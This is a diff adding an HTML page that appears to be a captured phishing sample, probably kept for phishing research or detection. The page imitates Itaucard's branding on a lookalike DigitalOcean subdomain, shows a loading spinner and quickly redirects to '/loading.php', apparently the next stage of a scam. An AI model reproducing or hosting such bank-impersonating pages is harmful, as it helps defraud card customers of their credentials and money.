@@ -1,0 +1,59 @@
+<!-- URL =http://clientevip-itaucard-com-br-765or.ondigitalocean.app/--><!-- w =(['ondigitalocean.app', 'ONDIGITALOCEAN.APP'], datetime.datetime(2020, 6, 1, 14, 39, 38), datetime.datetime(2025, 6, 1, 14, 39, 38))--><!DOCTYPE html>
+<html>
+ <head>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <title>
+   Itaucard
+  </title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js">
+  </script>
+  <link href="/imgs/favicon.png" rel="shortcut icon"/>
+  <style type="text/css">
+   body, html {
+			margin: 0;
+			padding: 0;
+			width: 100%;
+			height: 100%;
+			display: flex;
+			color: #fff;
+			background:
+        	linear-gradient(to left top, #2c6fbc -20%/*bottom-right color*/, #003399 70% /*top-left color*/);
+		}
+
+		.all {
+			display: flex;
+			margin: auto;
+		}
+
+		.loading {
+			width: 35px;
+			height: 35px;
+			border:solid 3px #ffffff38;
+			border-top-color: #FFF;
+			background: #EC7000;
+			border-radius: 50%;
+			animation: spin 1.2s ease-in-out infinite;
+			margin: auto;
+			margin-left: calc(50% - 200px);
+		}
+
+		@keyframes spin {
+			to {
+				transform: rotate(360deg);
+			}
+		}
+  </style>
+ </head>
+ <body>
+  <img src="/imgs/logobranca.png" style="width: 170px; height: 41.8359375px; margin-left: 15px; margin-top: 15px; margin-bottom: 5px;"/>
+  <div class="loading">
+  </div>
+  <script type="text/javascript">
+   $(document).ready(function(){
+		setTimeout(function(){
+			window.location.href = "/loading.php";
+		}, 100);
+	})
+  </script>
+ </body>
+</html>
